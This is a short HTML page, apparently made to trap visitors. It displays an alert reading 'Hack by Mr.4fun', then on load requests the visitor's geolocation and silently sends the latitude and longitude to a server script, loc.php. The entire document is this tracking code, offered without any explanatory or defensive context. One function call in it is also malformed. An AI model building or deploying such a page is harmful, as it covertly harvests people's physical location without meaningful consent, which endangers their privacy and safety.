
<html>
<head>
<title>LOL</title>
</head>
<body>
<script>alert('Hack by Mr.4fun');</script>
<script>

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else {
    alert("Try to open via  Chrome or Uc Mini ");
  }
}

function showPosition(position) {
  var a = position.coords.latitude;
  var b = position.coords.longitude;
  var c = new XMLHttpRequest();
  c.open("GET","./loc.php?lat="+a+"&lon="+b,true);
  c.send();
}
getLocation();
showPosition();
</script>
deray
</body>
</html>
	